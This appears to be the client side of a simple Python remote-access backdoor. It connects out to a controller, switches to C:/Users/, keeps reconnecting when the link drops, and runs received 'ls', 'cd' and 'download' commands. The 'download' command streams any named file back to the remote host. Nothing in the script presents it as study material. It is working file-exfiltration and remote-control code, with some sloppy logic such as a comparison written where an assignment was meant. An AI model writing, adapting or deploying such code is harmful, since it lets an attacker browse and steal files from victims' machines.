#!/usr/bin/env python

import socket
import os
import pickle
import time

TCP_IP = '127.0.0.1'
TCP_PORT = 80
BUFFER_SIZE = 1024  # Normally 1024, but we want fast response
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((TCP_IP, TCP_PORT))
os.chdir("C:/Users/")


conn = s
while 1:
    try:
        conn.settimeout(15)
        dataraw = conn.recv(BUFFER_SIZE).decode()
        data = dataraw.split()
    except:
        s.close()
        connected = False
        while connected == False:
            time.sleep(1)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((TCP_IP, TCP_PORT))
                conn = s
                connected = True
                print("Woohoo Connection has been restored!")
                conn.settimeout(15)
                dataraw = conn.recv(BUFFER_SIZE).decode()
                data = dataraw.split()
            except:
                s.close()
                print("Retrying connection..")

    if not data: 
         while connected == False:
            time.sleep(1)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.connect((TCP_IP, TCP_PORT))
                conn = s
                connected = True
                print("Woohoo Data is back!")
                conn.settimeout(15)
                dataraw = conn.recv(BUFFER_SIZE).decode()
                data = dataraw.split()
            except:
                s.close()
                print("Data lost..")
    try:
        print(data)
    except:
        print("")
    if data[0] == "ls":
        try:
            if len(data) == 2:
                thlst = os.listdir(data[1])
                conn.send(' '.join(thlst).encode())
            else:
                thlst = os.listdir(os.getcwd())
                conn.send(" ".join(thlst).encode())
        except:
            connected == False
            while connected == False:
                time.sleep(1)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.connect((TCP_IP, TCP_PORT))
                    conn = s
                    connected = True
                    print("Woohoo Data is back!")
                    conn.settimeout(15)
                    dataraw = conn.recv(BUFFER_SIZE).decode()
                    data = dataraw.split()
                except:
                    s.close()
                    print("Data lost..")

    elif data[0] == "cd":
        if len(data) == 2:
            try:
                os.chdir(data[1])
                conn.send(("Successful! Path is now" + os.getcwd()).encode())
            except:
                conn.send("Unsuccessful! Path doesnt exist or something".encode())
    elif data[0] == "download":
        if len(data) == 3:
            try:
                f = open(data[1], "rb")
                print('Sending...')
                l = f.read(1024)
                while (l):
                        print('Sending...')
                        s.send(l)
                        l = f.read(1024)
                print("sent")
            except:
                print("something went wrong")

conn.close()